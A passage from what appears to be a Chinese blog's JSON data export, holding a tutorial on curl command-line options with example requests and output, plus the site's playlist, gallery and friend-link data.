class=\"token operator\">=</span>604800\ncontent-type: text/html<span class=\"token punctuation\">;</span> charset<span class=\"token operator\">=</span>UTF-8\ndate: Mon, 11 Jan 2021 13:43:15 GMT\netag: <span class=\"token string\">\"3147526947+ident\"</span>\nexpires: Mon, 18 Jan 2021 13:43:15 GMT\nlast-modified: Thu, 17 Oct 2019 07:18:26 GMT\nserver: ECS <span class=\"token punctuation\">(</span>sjc/4E74<span class=\"token punctuation\">)</span>\nvary: Accept-Encoding\nx-cache: HIT\ncontent-length: 1256\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>doctype html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>head<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span>Example Domain<span class=\"token operator\">&lt;</span>/title<span class=\"token operator\">></span>\n\n    <span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string\">\"utf-8\"</span> /<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>meta http-equiv<span class=\"token operator\">=</span><span class=\"token string\">\"Content-type\"</span> content<span class=\"token operator\">=</span><span class=\"token string\">\"text/html; charset=utf-8\"</span> /<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>meta name<span class=\"token operator\">=</span><span class=\"token string\">\"viewport\"</span> content<span class=\"token operator\">=</span><span class=\"token string\">\"width=device-width, initial-scale=1\"</span> /<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>style type<span class=\"token operator\">=</span><span class=\"token string\">\"text/css\"</span><span class=\"token operator\">></span>\n    body <span class=\"token punctuation\">{</span>\n        background-color: <span class=\"token comment\" spellcheck=\"true\">#f0f0f2;</span>\n        margin: 0<span class=\"token punctuation\">;</span>\n        padding: 0<span class=\"token punctuation\">;</span>\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, <span class=\"token string\">\"Segoe UI\"</span>, <span class=\"token string\">\"Open Sans\"</span>, <span class=\"token string\">\"Helvetica Neue\"</span>, Helvetica, Arial, sans-serif<span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span>\n    div <span class=\"token punctuation\">{</span>\n        width: 600px<span class=\"token punctuation\">;</span>\n        margin: 5em auto<span class=\"token punctuation\">;</span>\n        padding: 2em<span class=\"token punctuation\">;</span>\n        background-color: <span class=\"token comment\" spellcheck=\"true\">#fdfdff;</span>\n        border-radius: 0.5em<span class=\"token punctuation\">;</span>\n        box-shadow: 2px 3px 7px 2px rgba<span class=\"token punctuation\">(</span>0,0,0,0.02<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    a:link, a:visited <span class=\"token punctuation\">{</span>\n        color: <span class=\"token comment\" spellcheck=\"true\">#38488f;</span>\n        text-decoration: none<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    @media <span class=\"token punctuation\">(</span>max-width: 700px<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        div <span class=\"token punctuation\">{</span>\n            margin: 0 auto<span class=\"token punctuation\">;</span>\n            width: auto<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token operator\">&lt;</span>/style<span class=\"token operator\">></span>    \n<span class=\"token operator\">&lt;</span>/head<span class=\"token operator\">></span>\n\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>div<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>h1<span class=\"token operator\">></span>Example Domain<span class=\"token operator\">&lt;</span>/h1<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>p<span class=\"token operator\">></span>This domain is <span class=\"token keyword\">for</span> use <span class=\"token keyword\">in</span> illustrative examples <span class=\"token keyword\">in</span> documents. You may use this\n    domain <span class=\"token keyword\">in</span> literature without prior coordination or asking <span class=\"token keyword\">for</span> permission.<span class=\"token operator\">&lt;</span>/p<span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>p<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">\"https://www.iana.org/domains/example\"</span><span class=\"token operator\">></span>More information<span class=\"token punctuation\">..</span>.<span class=\"token operator\">&lt;</span>/a<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>/p<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>/div<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>/body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>/html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"I\"><a href=\"#I\" class=\"headerlink\" title=\"-I\"></a><strong>-I</strong></h2><p><code>-I</code>参数则是只显示http response的头信息。</p>\n<h2 id=\"k\"><a href=\"#k\" class=\"headerlink\" title=\"-k\"></a><strong>-k</strong></h2><p><code>-k</code>参数指定跳过 SSL 检测。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -k https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令不会检查服务器的 SSL 证书是否正确。</p>\n<h2 id=\"L\"><a href=\"#L\" class=\"headerlink\" title=\"-L\"></a><strong>-L</strong></h2><p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -L -d <span class=\"token string\">'tweet=hi'</span> https://api.twitter.com/tweet<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"s\"><a href=\"#s\" class=\"headerlink\" title=\"-s\"></a><strong>-s</strong></h2><p><code>-s</code>参数将不输出错误和进度信息。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -s https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</p>\n<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -s -o /dev/null https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"S\"><a href=\"#S\" class=\"headerlink\" title=\"-S\"></a><strong>-S</strong></h2><p><code>-S</code>参数指定只输出错误信息，通常与<code>-o</code>一起使用。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -s -o /dev/null https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令没有任何输出，除非发生错误。</p>\n<h2 id=\"v\"><a href=\"#v\" class=\"headerlink\" title=\"-v\"></a><strong>-v</strong></h2><p><code>-v</code>参数输出通信的整个过程，用于调试。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -v https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p><code>--trace</code>参数也可以用于调试，还会输出原始的二进制数据。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl --trace - https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"e\"><a href=\"#e\" class=\"headerlink\" title=\"-e\"></a><strong>-e</strong></h2><p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">curl -e <span class=\"token string\">'https://google.com?q=example'</span> https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p>\n<p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">curl -H <span class=\"token string\">'Referer: https://google.com?q=example'</span> https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"x\"><a href=\"#x\" class=\"headerlink\" title=\"-x\"></a><strong>-x</strong></h2><p><code>-x</code>参数指定 HTTP 请求的代理。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p>\n<p>如果没有指定代理协议，默认为 HTTP。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -x james:cats@myproxy.com:8080 https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令中，请求的代理使用 HTTP 协议。</p>\n<h2 id=\"X\"><a href=\"#X\" class=\"headerlink\" title=\"-X\"></a><strong>-X</strong></h2><p><code>-X</code>参数指定 HTTP 请求的方法。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -X POST https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令对<code>https://www.example.com</code>发出 POST 请求。</p>\n<h2 id=\"写入（上传）或保存（下载）文件或信息\"><a href=\"#写入（上传）或保存（下载）文件或信息\" class=\"headerlink\" title=\"写入（上传）或保存（下载）文件或信息\"></a>写入（上传）或保存（下载）文件或信息</h2><h2 id=\"o\"><a href=\"#o\" class=\"headerlink\" title=\"-o\"></a><strong>-o</strong></h2><p><code>-o</code>参数将服务器的回应保存成文件，等同于<code>wget</code>命令。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -o example.html https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令将<code>www.example.com</code>保存成<code>example.html</code>。</p>\n<h2 id=\"O\"><a href=\"#O\" class=\"headerlink\" title=\"-O\"></a><strong>-O</strong></h2><p><code>-O</code>参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -O https://www.example.com/foo/bar.html<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p>\n<h2 id=\"b\"><a href=\"#b\" class=\"headerlink\" title=\"-b\"></a><strong>-b</strong></h2><p><code>-b</code>参数用来向服务器发送 Cookie。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -b <span class=\"token string\">'foo=bar'</span> https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令会生成一个标头<code>Cookie: foo=bar</code>，向服务器发送一个名为<code>foo</code>、值为<code>bar</code>的 Cookie。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -b <span class=\"token string\">'foo1=bar;foo2=bar2'</span> https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令发送两个 Cookie。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -b cookies.txt https://www.google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令读取本地文件<code>cookies.txt</code>，里面是服务器设置的 Cookie（参见<code>-c</code>参数），将其发送到服务器。</p>\n<h2 id=\"c\"><a href=\"#c\" class=\"headerlink\" title=\"-c\"></a><strong>-c</strong></h2><p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -c cookies.txt https://www.google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件<code>cookies.txt</code>。</p>\n<h2 id=\"d-1\"><a href=\"#d-1\" class=\"headerlink\" title=\"-d\"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -d<span class=\"token string\">'login=emma＆password=123'</span>-X POST https://google.com/login\n<span class=\"token comment\" spellcheck=\"true\"># 或者</span>\n$ curl -d <span class=\"token string\">'login=emma'</span> -d <span class=\"token string\">'password=123'</span> -X POST  https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>\n<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -d <span class=\"token string\">'@data.txt'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>\n<h2 id=\"–data-urlencode-1\"><a href=\"#–data-urlencode-1\" class=\"headerlink\" title=\"–data-urlencode\"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl --data-urlencode <span class=\"token string\">'comment=hello world'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>\n<h2 id=\"F\"><a href=\"#F\" class=\"headerlink\" title=\"-F\"></a><strong>-F</strong></h2><p><code>-F</code>参数用来向服务器上传二进制文件。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -F <span class=\"token string\">'file=@photo.png'</span> https://google.com/profile<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p>\n<p><code>-F</code>参数可以指定 MIME 类型。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -F <span class=\"token string\">'file=@photo.png;type=image/png'</span> https://google.com/profile<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p>\n<p><code>-F</code>参数也可以指定文件名。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -F <span class=\"token string\">'file=@photo.png;filename=me.png'</span> https://google.com/profile<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p>\n<h2 id=\"G\"><a href=\"#G\" class=\"headerlink\" title=\"-G\"></a><strong>-G</strong></h2><p><code>-G</code>参数用来构造 URL 的查询字符串。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -G -d <span class=\"token string\">'q=kitties'</span> -d <span class=\"token string\">'count=20'</span> https://google.com/search<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p>\n<p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -G --data-urlencode <span class=\"token string\">'comment=hello world'</span> https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"u\"><a href=\"#u\" class=\"headerlink\" title=\"-u\"></a><strong>-u</strong></h2><p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -u <span class=\"token string\">'bob:12345'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令设置用户名为<code>bob</code>，密码为<code>12345</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p>\n<p>curl 能够识别 URL 里面的用户名和密码。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl https://bob:12345@google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -u <span class=\"token string\">'bob'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令只设置了用户名，执行后，curl 会提示用户输入密码。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"curl命令参数和用法\"><a href=\"#curl命令参数和用法\" class=\"headerlink\" title=\"curl命令参数和用法\"></a>curl命令参数和用法</h1><p>curl即“客户端（client）的url工具”，是一种非常常用的命令行工具，用于请求服务端资源。</p>\n<h2 id=\"不带参数-查看源代码\"><a href=\"#不带参数-查看源代码\" class=\"headerlink\" title=\"不带参数(查看源代码)\"></a>不带参数(查看源代码)</h2><p>不带有任何参数时，curl 就是发出 GET 请求。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl https://www.example.com</code></pre>\n</blockquote>\n<pre><code>　　&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;\n　　&lt;html&gt;&lt;head&gt;\n　　&lt;title&gt;301 Moved Permanently&lt;/title&gt;\n　　&lt;/head&gt;&lt;body&gt;\n　　&lt;h1&gt;Moved Permanently&lt;/h1&gt;\n　　&lt;p&gt;The document has moved &lt;a href=&quot;http://www.example.com.cn/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;\n　　&lt;/body&gt;&lt;/html&gt;</code></pre><p>如果要把这个网页保存下来，可以使用<code>-o</code>参数，这就相当于使用<strong>wget</strong>命令了。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -o [文件名] www.example.com</code></pre>\n</blockquote>\n<h2 id=\"关于报头或响应信息\"><a href=\"#关于报头或响应信息\" class=\"headerlink\" title=\"关于报头或响应信息\"></a>关于报头或响应信息</h2><h2 id=\"A\"><a href=\"#A\" class=\"headerlink\" title=\"-A\"></a><strong>-A</strong></h2><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -A &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39; https://google.com</code></pre>\n</blockquote>\n<p>上面命令将<code>User-Agent</code>改成 Chrome 浏览器。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -A &#39;&#39; https://google.com</code></pre>\n</blockquote>\n<p>上面命令会移除<code>User-Agent</code>标头。</p>\n<h2 id=\"H\"><a href=\"#H\" class=\"headerlink\" title=\"-H\"></a><strong>-H</strong></h2><p><code>-H</code>参数添加 HTTP 请求的标头。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -H &#39;Accept-Language: en-US&#39; https://google.com</code></pre>\n</blockquote>\n<p>上面命令添加 HTTP 标头<code>Accept-Language: en-US</code>。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -H &#39;Accept-Language: en-US&#39; -H &#39;Secret-Message: xyzzy&#39; https://google.com</code></pre>\n</blockquote>\n<p>上面命令添加两个 HTTP 标头。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -d &#39;{&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面命令添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p>\n<h2 id=\"d\"><a href=\"#d\" class=\"headerlink\" title=\"-d\"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -d&#39;login=emma＆password=123&#39;-X POST https://google.com/login\n# 或者\n$ curl -d &#39;login=emma&#39; -d &#39;password=123&#39; -X POST  https://google.com/login</code></pre>\n</blockquote>\n<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>\n<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -d &#39;@data.txt&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>\n<h2 id=\"–data-urlencode\"><a href=\"#–data-urlencode\" class=\"headerlink\" title=\"–data-urlencode\"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl --data-urlencode &#39;comment=hello world&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>\n<h2 id=\"i\"><a href=\"#i\" class=\"headerlink\" title=\"-i\"></a>-i</h2><p><code>-i</code>参数可以显示http response的头信息，连同网页代码一起。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -i https://www.example.com                                                                                                                                                                                                  130 ↵\nHTTP/2 200 \naccept-ranges: bytes\nage: 551684\ncache-control: max-age=604800\ncontent-type: text/html; charset=UTF-8\ndate: Mon, 11 Jan 2021 13:43:15 GMT\netag: &quot;3147526947+ident&quot;\nexpires: Mon, 18 Jan 2021 13:43:15 GMT\nlast-modified: Thu, 17 Oct 2019 07:18:26 GMT\nserver: ECS (sjc/4E74)\nvary: Accept-Encoding\nx-cache: HIT\ncontent-length: 1256\n\n&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Example Domain&lt;/title&gt;\n\n    &lt;meta charset=&quot;utf-8&quot; /&gt;\n    &lt;meta http-equiv=&quot;Content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;\n    &lt;style type=&quot;text/css&quot;&gt;\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;\n\n    }\n    div {\n        width: 600px;\n        margin: 5em auto;\n        padding: 2em;\n        background-color: #fdfdff;\n        border-radius: 0.5em;\n        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n    }\n    a:link, a:visited {\n        color: #38488f;\n        text-decoration: none;\n    }\n    @media (max-width: 700px) {\n        div {\n            margin: 0 auto;\n            width: auto;\n        }\n    }\n    &lt;/style&gt;    \n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div&gt;\n    &lt;h1&gt;Example Domain&lt;/h1&gt;\n    &lt;p&gt;This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.&lt;/p&gt;\n    &lt;p&gt;&lt;a href=&quot;https://www.iana.org/domains/example&quot;&gt;More information...&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n</blockquote>\n<h2 id=\"I\"><a href=\"#I\" class=\"headerlink\" title=\"-I\"></a><strong>-I</strong></h2><p><code>-I</code>参数则是只显示http response的头信息。</p>\n<h2 id=\"k\"><a href=\"#k\" class=\"headerlink\" title=\"-k\"></a><strong>-k</strong></h2><p><code>-k</code>参数指定跳过 SSL 检测。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -k https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令不会检查服务器的 SSL 证书是否正确。</p>\n<h2 